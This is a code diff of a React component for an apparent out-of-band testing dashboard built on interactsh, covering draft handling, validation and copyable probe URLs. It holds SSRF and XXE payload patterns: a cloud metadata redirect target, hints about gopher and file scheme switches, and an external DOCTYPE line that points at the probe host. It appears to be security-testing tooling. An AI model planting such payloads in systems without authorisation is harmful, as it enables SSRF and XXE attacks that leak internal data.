@@ -1,11 +1,11 @@
 // The HTTP response tab: how this probe answers HTTP and HTTPS hits (phase 2, answered by the edge).
 // The preview comes from the server, which runs the same code as the edge.
 import { useEffect, useMemo, useState, type ReactNode } from "react";
-import { ChevronLeft, ChevronRight, Plus, X } from "lucide-react";
-import { useApp, fetchRule, previewRule, saveRule, setRuleDirty, takeRuleSeed } from "@/store";
+import { ChevronLeft, ChevronRight, Copy, Plus, X } from "lucide-react";
+import { useApp, getState, fetchRule, previewRule, saveRule, setRuleDraft, takeRuleSeed } from "@/store";
 import type { HttpRule, Probe, RuleMode, RuleState, RuleVersion } from "@/lib/types";
 import { dayOrTime, plural } from "@/lib/format";
-import { toast } from "@/lib/toast";
+import { copy, toast } from "@/lib/toast";
 import { Button } from "@/components/ui/button";
 import { Switch } from "@/components/ui/switch";
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
@@ -57,16 +57,40 @@ function templates(tag: string, host: string): Record<string, { label: string; c
 }
 
 const norm = (r: HttpRule): HttpRule => (r.mode === "default" ? DEFAULT : { ...DEFAULT, ...MODE_DEFAULTS[r.mode], ...r });
+// The draft keeps every mode's fields (switching mode loses nothing); this is the part that counts.
+const KEYS: Record<RuleMode, (keyof HttpRule)[]> = {
+  default: [],
+  redirect: ["status", "location", "loop"],
+  custom: ["status", "headers", "body", "bodyEncoding"],
+  file: ["contentType", "body", "bodyEncoding", "template"],
+};
+function effective(r: HttpRule): HttpRule {
+  if (r.mode === "default") return DEFAULT;
+  const n = norm(r);
+  const out: Record<string, unknown> = { mode: n.mode, delayMs: n.delayMs, schemes: { http: n.schemes.http, https: n.schemes.https } };
+  for (const k of KEYS[n.mode]) out[k] = n[k];
+  return out as unknown as HttpRule;
+}
+const same = (a: HttpRule, b: HttpRule) => JSON.stringify(effective(a)) === JSON.stringify(effective(b));
+// which field a validation message is about, so the field itself can say so
+function errorField(msg?: string) {
+  if (!msg) return null;
+  for (const [re, f] of [[/^Location/, "location"], [/^(Redirect status|Status)/, "status"], [/^Loop/, "loop"], [/[Hh]eader/, "headers"],
+    [/^Body/, "body"], [/^Delay/, "delay"], [/^Content type/, "contentType"], [/HTTP, HTTPS or both/, "schemes"]] as [RegExp, string][]) if (re.test(msg)) return f;
+  return null;
+}
+const CUTOVER = "sudo ~/work/tools/oob-dashboard/deploy/cutover-phase2.sh";
 const fld = "flex h-[30px] min-w-0 items-center gap-2 rounded-[3px] border border-rule bg-well px-2.5 font-mono text-[12.5px] text-bone transition-colors focus-within:border-smoke";
 const inputCls = "min-w-0 flex-1 bg-transparent outline-none placeholder:text-ash";
-const seg = "h-[26px] rounded-none border-l border-rule px-[11px] text-[12px] text-smoke first:border-l-0 data-[state=on]:bg-soot-2 data-[state=on]:font-semibold data-[state=on]:text-bone";
+const seg = "h-[26px] rounded-none border-l border-rule px-[11px] text-[12.5px] text-smoke first:border-l-0 data-[state=on]:bg-soot-2 data-[state=on]:font-semibold data-[state=on]:text-bone";
 
-const Row = ({ label, children, help }: { label: string; children: ReactNode; help?: ReactNode }) => (
+const Row = ({ label, children, help, error }: { label: string; children: ReactNode; help?: ReactNode; error?: string | null }) => (
   <>
     <dt className="pt-[5px] text-[12.5px] font-[550] text-smoke">{label}</dt>
     <dd className="flex min-w-0 flex-col gap-1.5">
       {children}
-      {help && <p className="max-w-[64ch] text-[11.5px] leading-4 text-ash">{help}</p>}
+      {error && <p role="alert" className="max-w-[64ch] text-[11px] leading-4 text-bad">{error}</p>}
+      {help && <p className="max-w-[64ch] text-[11px] leading-4 text-ash">{help}</p>}
     </dd>
   </>
 );
@@ -80,9 +104,9 @@ function Seg<T extends string>({ value, onChange, items, label, mono }: { value:
   );
 }
 
-function Num({ value, onChange, label, max, w = "w-[64px]" }: { value: number; onChange: (n: number) => void; label: string; max: number; w?: string }) {
+function Num({ value, onChange, label, max, w = "w-[64px]", invalid }: { value: number; onChange: (n: number) => void; label: string; max: number; w?: string; invalid?: boolean }) {
   return (
-    <label className={cn(fld, w)}>
+    <label className={cn(fld, w, invalid && "border-bad")}>
       <input inputMode="numeric" aria-label={label} value={String(value)} className={cn(inputCls, "text-right")}
         onChange={(e) => { const n = Number(e.target.value.replace(/\D/g, "").slice(0, 6) || 0); onChange(Math.min(n, max)); }} />
     </label>
@@ -92,6 +116,7 @@ function Num({ value, onChange, label, max, w = "w-[64px]" }: { value: number; o
 export function HttpRuleTab({ p }: { p: Probe }) {
   const host = useApp((s) => s.status?.payload?.host) || "<id>.oob.example";
   const edge = useApp((s) => s.status?.edge);
+  const live = edge?.state === "running";
   const [rs, setRs] = useState<RuleState | null>(null);
   const [loadErr, setLoadErr] = useState<string | null>(null);
   const [draft, setDraft] = useState<HttpRule>(DEFAULT);
@@ -107,35 +132,36 @@ export function HttpRuleTab({ p }: { p: Probe }) {
     fetchRule(p.tag).then((r) => {
       if (!live) return;
       setRs(r); setLoadErr(null); setHop(1);
-      const seed = r.active ? null : takeRuleSeed(p.tag); // planted as Redirect / Hosted file
-      setDraft(norm(seed ? { ...DEFAULT, ...MODE_DEFAULTS[seed], mode: seed } : r.active?.rule ?? DEFAULT));
+      const kept = getState().ruleDrafts[p.tag]; // unsaved edits from before a tab or probe switch
+      const seed = r.active || kept ? null : takeRuleSeed(p.tag); // planted as Redirect / Hosted file
+      setDraft(kept ?? norm(seed ? { ...DEFAULT, ...MODE_DEFAULTS[seed], mode: seed } : r.active?.rule ?? DEFAULT));
     },
       (e) => live && setLoadErr((e as Error).message));
     return () => { live = false; };
   }, [p.tag, activeVersion]);
 
   const base = useMemo(() => norm(rs?.active?.rule ?? DEFAULT), [rs]);
-  const dirty = rs != null && JSON.stringify(draft) !== JSON.stringify(base);
-  useEffect(() => { setRuleDirty(dirty ? p.tag : null); }, [dirty, p.tag]);
-  useEffect(() => () => setRuleDirty(null), []);
+  const dirty = rs != null && !same(draft, base);
+  // the draft is kept in the store, so the tab label says "edited" and nothing is lost on a switch
+  useEffect(() => { if (rs) setRuleDraft(p.tag, dirty ? draft : null); }, [rs, dirty, draft, p.tag]);
 
   // preview the exact next answer (debounced; the server validates)
   useEffect(() => {
     const t = setTimeout(() => {
-      previewRule(p.tag, draft, scheme, hop).then((r) => setPreview(r.error ? { error: r.error } : r), (e) => setPreview({ error: (e as Error).message }));
+      previewRule(p.tag, effective(draft), scheme, hop).then((r) => setPreview(r.error ? { error: r.error } : r), (e) => setPreview({ error: (e as Error).message }));
     }, 220);
     return () => clearTimeout(t);
   }, [p.tag, draft, scheme, hop]);
 
   const set = (patch: Partial<HttpRule>) => setDraft((d) => ({ ...d, ...patch }));
-  const setMode = (mode: RuleMode) => { setDraft((d) => norm({ ...DEFAULT, ...(mode === d.mode ? d : MODE_DEFAULTS[mode]), mode, delayMs: d.delayMs, schemes: d.schemes })); setHop(1); };
+  const setMode = (mode: RuleMode) => { setDraft((d) => ({ ...MODE_DEFAULTS[mode], ...d, mode })); setHop(1); };
   const nextVersion = (rs?.history[0]?.version ?? 0) + 1;
   const save = async () => {
     setSaving(true);
     try {
-      const r = await saveRule(p.tag, draft);
+      const r = await saveRule(p.tag, effective(draft));
       setRs(r); setDraft(norm(r.active?.rule ?? DEFAULT));
-      toast(edge?.state === "running" ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. The edge isn't live yet, so the internet still gets interactsh's reply.`);
+      toast(live ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. Not served until you run the cutover: the internet still gets interactsh's reply.`);
     } catch (e) { toast((e as Error).message, true); } finally { setSaving(false); }
   };
 
@@ -143,34 +169,45 @@ export function HttpRuleTab({ p }: { p: Probe }) {
   const tpl = templates(p.tag, host);
   const loop = draft.mode === "redirect" ? draft.loop ?? 0 : 0;
   const hops = loop ? loop + 1 : 1;
+  const errF = errorField(preview.error);
+  const errFor = (f: string) => (errF === f ? preview.error!.replace(/^Can't answer like this yet: /, "") : null);
+  const bad = (f: string) => errF === f && "border-bad";
 
   return (
-    <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="relative grid min-h-0 grid-cols-[minmax(0,1fr)_400px] content-start gap-x-7 overflow-auto px-6 pt-[18px] max-[1180px]:grid-cols-1 max-[820px]:px-3.5">
-      {edge?.state !== "running" && (
-        <p className="col-span-full mb-4 rounded-[3px] border border-[#6b5126] bg-[#2b2113] px-3 py-2 text-[12px] leading-[18px] text-[#f3d9a4]">
-          <b className="font-semibold">The edge isn't in front of interactsh yet.</b> Rules save and preview here, but the internet still gets interactsh's default reply until the operator runs <code className="font-mono">deploy/cutover-phase2.sh</code>.
+    // the panel is the container: the two columns collapse on its own width, not the window's
+    <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="@container min-h-0 overflow-auto max-[820px]:overflow-visible">
+    <div className="relative grid grid-cols-[minmax(0,1fr)_400px] content-start gap-x-7 px-6 pt-[18px] @max-[940px]:grid-cols-1 max-[820px]:px-3.5">
+      {(!edge || edge.state === "absent") && (
+        <div className="col-span-full mb-4 flex flex-wrap items-center gap-x-3 gap-y-1.5 rounded-[3px] border border-[#6b5126] bg-[#2b2113] px-3 py-2 text-[12.5px] leading-[18px] text-[#f3d9a4]">
+          <span><b className="font-semibold">Rules aren't served yet.</b> Until you run the cutover, the internet still gets interactsh's default reply. Rules save and preview here meanwhile.</span>
+          <Button variant="quiet" size="sm" className="max-w-full" onClick={() => copy(CUTOVER, "cutover command")}><Copy /><span className="truncate font-mono">{CUTOVER}</span></Button>
+        </div>
+      )}
+      {edge && edge.state !== "absent" && !live && (
+        <p className="col-span-full mb-4 rounded-[3px] border border-[#6a2f22] bg-[#2a1914] px-3 py-2 text-[12.5px] leading-[18px] text-[#f4c6b8]">
+          <b className="font-semibold">The edge isn't answering.</b> Your probes get no HTTP reply and their hits aren't captured until it's back (sudo systemctl restart colluder-edge).
         </p>
       )}
       <dl className="m-0 grid grid-cols-[96px_minmax(0,1fr)] content-start gap-x-[18px] gap-y-4 pb-4 max-[820px]:grid-cols-1 max-[820px]:gap-y-1.5">
-        <Row label="Answer with" help={draft.mode === "default" ? "interactsh's standard reply: 200, CORS headers, the id reversed in the body. Answered by Colluder, so the hit records exactly what was sent." : "For HTTP and HTTPS hits on this probe. DNS lookups still get interactsh's answer."}>
+        <Row label="Answer with" help={draft.mode === "default" ? `interactsh's standard reply: 200, CORS headers, the id reversed in the body.${live ? " Sent by Colluder's edge, so the hit records exactly what went out." : ""}` : "For HTTP and HTTPS hits on this probe. DNS lookups still get interactsh's answer."}>
           <Seg label="Answer with" value={draft.mode} onChange={setMode} items={MODES} />
         </Row>
 
         {draft.mode === "redirect" && (
           <>
-            <Row label="Status" help="302 and 303 usually turn a POST into a GET; 307 and 308 keep the method and body.">
+            <Row label="Status" error={errFor("status")} help="302 and 303 usually turn a POST into a GET; 307 and 308 keep the method and body.">
               <Seg label="Redirect status" mono value={String(draft.status)} onChange={(v) => set({ status: Number(v) })} items={["301", "302", "303", "307", "308"].map((s) => [s, s])} />
             </Row>
-            <Row label="Location" help="Scheme switches (gopher, dict, file) only land if the client follows them. Cloud targets listed here need no extra request headers.">
+            <Row label="Location" error={errFor("location")} help="Scheme switches (gopher, dict, file) only land if the client follows them. Cloud targets listed here need no extra request headers.">
               <div className="flex min-w-0 gap-2">
-                <label className={cn(fld, "flex-1")}><input aria-label="Location" spellCheck={false} value={draft.location ?? ""} placeholder="http://169.254.169.254/latest/meta-data/" className={inputCls} onChange={(e) => set({ location: e.target.value })} /></label>
+                <label className={cn(fld, "flex-1", bad("location"))}><input aria-label="Location" aria-invalid={errF === "location"} spellCheck={false} value={draft.location ?? ""} placeholder="Where to send the client: type a URL or pick a target" className={cn(inputCls, "placeholder:font-sans")} onChange={(e) => set({ location: e.target.value })} /></label>
                 <Select value="" onValueChange={(v) => set({ location: v })}>
                   <SelectTrigger aria-label="Pick a target" className="h-[30px] w-auto gap-1.5 rounded-[3px] border-rule bg-transparent px-2.5 text-[12.5px] font-[550]"><SelectValue placeholder="Targets" /></SelectTrigger>
                   <SelectContent>{TARGETS.map(([l, u]) => <SelectItem key={u} value={u}>{l}</SelectItem>)}</SelectContent>
                 </Select>
               </div>
             </Row>
-            <Row label="Loop first" help={<>A blind SSRF that follows redirects shows up as a run of hits, <b className="font-[550] text-smoke">hop=1</b> to <b className="font-[550] text-smoke">hop={loop + 1}</b>. One that doesn't follow stops at hop 1. Each hop keeps the scheme it arrived on.</>}>
+            <Row label="Loop first" error={errFor("loop")} help={loop ? <>A blind SSRF that follows redirects shows up as a run of {loop + 1} hits: the first request, then <b className="font-[550] text-smoke">?hop=2</b> to <b className="font-[550] text-smoke">?hop={loop + 1}</b>. One that doesn't follow stops after the first. Each hop keeps the scheme it arrived on.</> : "Bounce the client back through this probe before the final redirect, so following redirects shows up as a run of hits."}>
               <div className="flex items-center gap-2">
                 <Switch aria-label="Loop through this probe first" checked={loop > 0} onCheckedChange={(on) => { set({ loop: on ? 9 : 0 }); setHop(1); }} />
                 {loop > 0 && <><Num label="Hops" value={loop} max={20} onChange={(n) => { set({ loop: Math.max(n, 1) }); setHop(1); }} /><span className="text-[12.5px] text-smoke">hops through this probe first</span></>}
@@ -181,11 +218,11 @@ export function HttpRuleTab({ p }: { p: Probe }) {
 
         {draft.mode === "custom" && (
           <>
-            <Row label="Status"><Num label="Status" value={draft.status ?? 200} max={599} onChange={(n) => set({ status: n })} /></Row>
-            <Row label="Headers" help="Content-Length is computed and Connection is always close. Server stays oob.example unless you set one.">
+            <Row label="Status" error={errFor("status")}><Num label="Status" invalid={errF === "status"} value={draft.status ?? 200} max={599} onChange={(n) => set({ status: n })} /></Row>
+            <Row label="Headers" error={errFor("headers")} help="Content-Length is computed and Connection is always close. Server stays oob.example unless you set one.">
               {(draft.headers ?? []).map(([n, v], i) => (
                 <div key={i} className="flex gap-2">
-                  <label className={cn(fld, "w-[180px]")}><input aria-label={`Header ${i + 1} name`} spellCheck={false} value={n} placeholder="Name" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [e.target.value, h[1]] : h)) })} /></label>
+                  <label className={cn(fld, "w-[180px]", bad("headers"))}><input aria-label={`Header ${i + 1} name`} spellCheck={false} value={n} placeholder="Name" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [e.target.value, h[1]] : h)) })} /></label>
                   <label className={cn(fld, "flex-1")}><input aria-label={`Header ${i + 1} value`} spellCheck={false} value={v} placeholder="Value" className={inputCls} onChange={(e) => set({ headers: (draft.headers ?? []).map((h, j) => (j === i ? [h[0], e.target.value] : h)) })} /></label>
                   <Button variant="ghost" size="icon-sm" aria-label={`Remove header ${n || i + 1}`} onClick={() => set({ headers: (draft.headers ?? []).filter((_, j) => j !== i) })}><X /></Button>
                 </div>
@@ -203,24 +240,28 @@ export function HttpRuleTab({ p }: { p: Probe }) {
                 <SelectContent>{Object.entries(tpl).map(([k, t]) => <SelectItem key={k} value={k}>{t.label}</SelectItem>)}</SelectContent>
               </Select>
             </Row>
-            <Row label="Content type"><label className={fld}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
+            {draft.template && plantHint(draft.template, p.tag, host) && <Row label="Plant this">{plantHint(draft.template, p.tag, host)}</Row>}
+            <Row label="Fetch URL" help="The file is served at any path under the probe, over HTTP and HTTPS.">
+              {[`http://${p.tag}.${host}/x`, `https://${host}/${p.tag}/x`].map((u) => <CopyLine key={u} text={u} what="fetch URL" />)}
+            </Row>
+            <Row label="Content type" error={errFor("contentType")}><label className={cn(fld, bad("contentType"))}><input aria-label="Content type" spellCheck={false} value={draft.contentType ?? ""} className={inputCls} onChange={(e) => set({ contentType: e.target.value })} /></label></Row>
           </>
         )}
 
         {(draft.mode === "custom" || draft.mode === "file") && (
-          <Row label="Body" help={`Up to 256 KB. ${draft.bodyEncoding === "base64" ? "Base64 is decoded before sending, for binary bodies." : "Sent as UTF-8."}`}>
-            <textarea aria-label="Body" spellCheck={false} rows={8} value={draft.body ?? ""} onChange={(e) => set({ body: e.target.value })}
-              className="min-h-[120px] w-full resize-y rounded-[3px] border border-rule bg-well px-2.5 py-2 font-mono text-[12.5px] leading-[18px] text-bone outline-none focus:border-smoke" />
+          <Row label="Body" error={errFor("body")} help={`Up to 256 KB. ${draft.bodyEncoding === "base64" ? "Base64 is decoded before sending, for binary bodies." : "Sent as UTF-8."}`}>
+            <textarea aria-label="Body" aria-invalid={errF === "body"} spellCheck={false} rows={8} value={draft.body ?? ""} onChange={(e) => set({ body: e.target.value })}
+              className={cn("min-h-[120px] w-full resize-y rounded-[3px] border border-rule bg-well", "px-2.5 py-2 font-mono text-[12.5px] leading-[18px] text-bone outline-none focus:border-smoke", bad("body"))} />
             <Seg label="Body encoding" value={draft.bodyEncoding ?? "text"} onChange={(v) => set({ bodyEncoding: v })} items={[["text", "Text"], ["base64", "Base64"]]} />
           </Row>
         )}
 
         {draft.mode !== "default" && (
           <>
-            <Row label="Delay" help="Hold the answer to probe timeouts, up to 60 s.">
-              <div className="flex items-center gap-2"><Num label="Delay in milliseconds" value={draft.delayMs} max={60000} w="w-[84px]" onChange={(n) => set({ delayMs: n })} /><span className="text-[12.5px] text-smoke">ms before answering</span></div>
+            <Row label="Delay" error={errFor("delay")} help="Hold the answer to probe timeouts, up to 60 s.">
+              <div className="flex items-center gap-2"><Num label="Delay in milliseconds" invalid={errF === "delay"} value={draft.delayMs} max={60000} w="w-[84px]" onChange={(n) => set({ delayMs: n })} /><span className="text-[12.5px] text-smoke">ms before answering</span></div>
             </Row>
-            <Row label="Applies to" help="A scheme that's off gets the default reply.">
+            <Row label="Applies to" error={errFor("schemes")} help="A scheme that's off gets the default reply.">
               <div className="flex items-center gap-4 text-[12.5px]">
                 {(["http", "https"] as const).map((k) => (
                   <label key={k} className="flex cursor-pointer items-center gap-[7px]">
@@ -237,8 +278,8 @@ export function HttpRuleTab({ p }: { p: Probe }) {
       <aside className="flex min-w-0 flex-col gap-3.5 pb-4" aria-label="Preview and history">
         <div className="flex flex-col rounded-[3px] border border-rule-2 bg-well">
           <div className="flex h-8 items-center gap-2 border-b border-rule-2 pr-1.5 pl-3 text-[12.5px] font-[650]">
-            Next answer
-            <span className="truncate text-[11px] font-normal text-ash">{loop ? `hop ${hop} of ${hops}` : scheme.toUpperCase()}{dirty ? ", with your unsaved changes" : ""}{preview.delayMs ? `, after ${preview.delayMs} ms` : ""}</span>
+            <span className="whitespace-nowrap">Next answer</span>
+            <span className="truncate text-[11px] font-normal text-ash" title={dirty ? "Includes your unsaved changes" : undefined}>{scheme.toUpperCase()}{loop ? ` · hop ${hop}/${hops}` : ""}{dirty ? " · unsaved" : ""}{preview.delayMs ? ` · after ${preview.delayMs} ms` : ""}</span>
             <span className="ml-auto flex items-center gap-0.5">
               <Seg label="Preview scheme" value={scheme} onChange={setScheme} items={[["http", "HTTP"], ["https", "HTTPS"]]} />
               {loop > 0 && <>
@@ -257,21 +298,45 @@ export function HttpRuleTab({ p }: { p: Probe }) {
           <ol className="m-0 list-none py-1">
             {(rs?.history ?? []).map((v) => <HistoryRow key={v.version} v={v} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
             <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-[12.5px]">
-              <span /><span /><span className="truncate text-smoke">Default reply (no rule)</span>
-              <span className="text-[11.5px] text-ash">answered {plural(rs?.defaultHits ?? 0, "hit")}</span>
+              <span /><span /><span className="truncate text-smoke">Default reply from Colluder (no rule)</span>
+              <span className="text-[11px] text-ash">answered {plural(rs?.defaultHits ?? 0, "hit")}</span>
             </li>
+            {!!rs?.interactshHits && (
+              <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-[12.5px]">
+                <span /><span /><span className="truncate text-smoke">Answered by interactsh (before the edge)</span>
+                <span className="text-[11px] text-ash">{plural(rs.interactshHits, "hit")}</span>
+              </li>
+            )}
           </ol>
         </div>
       </aside>
 
-      <div className="sticky bottom-0 col-span-full flex flex-wrap items-center gap-2 border-t border-rule-2 bg-soot py-3">
-        {dirty && <span className="mr-1 flex items-center gap-1.5 text-[12px] text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
+      <div className="sticky bottom-0 col-span-full flex flex-wrap items-center gap-2 border-t border-rule-2 bg-soot py-3 max-[820px]:bottom-7">
+        {dirty && <span className="mr-1 flex items-center gap-1.5 text-[12.5px] text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
         <Button disabled={!dirty || saving || !!preview.error} onClick={save}>Save as v{nextVersion}</Button>
         <Button variant="quiet" disabled={!dirty || saving} onClick={() => { setDraft(base); setHop(1); }}>Discard</Button>
-        <span className="ml-2 text-[11.5px] text-ash">Saved rules answer the next hit. Earlier hits keep the answer they got.</span>
+        <span className="ml-2 text-[11px] text-ash">{live ? "Saved rules answer the next hit." : "Saved rules go live with the cutover."} Earlier hits keep the answer they got.</span>
       </div>
     </div>
+    </div>
   );
+}
+
+function CopyLine({ text, what }: { text: string; what: string }) {
+  return (
+    <div className="flex min-w-0 items-center gap-1">
+      <code className="truncate font-mono text-[12.5px] text-smoke" title={text}>{text}</code>
+      <Button variant="ghost" size="icon-sm" aria-label={`Copy ${what}`} onClick={() => copy(text, what)}><Copy /></Button>
+    </div>
+  );
+}
+
+// what to put in the target so it fetches the hosted file
+function plantHint(template: string, tag: string, host: string) {
+  if (template === "xxe-dtd") return <CopyLine text={`<!DOCTYPE x SYSTEM "http://${tag}.${host}/x.dtd">`} what="DOCTYPE line" />;
+  if (template === "svg") return <CopyLine text={`<img src="https://${host}/${tag}/x.svg">`} what="image tag" />;
+  if (template === "headless-page") return <CopyLine text={`https://${host}/${tag}/page.html`} what="page URL" />;
+  return null;
 }
 
 function HistoryRow({ v, current, onLoad }: { v: RuleVersion; current: boolean; onLoad: () => void }) {
@@ -280,10 +345,10 @@ function HistoryRow({ v, current, onLoad }: { v: RuleVersion; current: boolean; 
     : r.mode === "file" ? `Hosted file, ${r.contentType}` : `Custom ${r.status}`;
   return (
     <li className={cn("grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-[12.5px]", current && "bg-soot-2")}>
-      <span className="text-[11.5px] text-smoke">v{v.version}</span>
+      <span className="text-[11px] text-smoke">v{v.version}</span>
       <span className="font-semibold">{dayOrTime(v.createdAt)}</span>
       <button type="button" className="cursor-pointer truncate text-left text-smoke hover:text-bone" title={`Load v${v.version} into the editor`} onClick={onLoad}>{what}</button>
-      <span className="text-[11.5px] whitespace-nowrap text-ash">{current ? "active · " : ""}answered {plural(v.hits ?? 0, "hit")}</span>
+      <span className="text-[11px] whitespace-nowrap text-ash">{current ? "active · " : ""}answered {plural(v.hits ?? 0, "hit")}</span>
     </li>
   );
 }
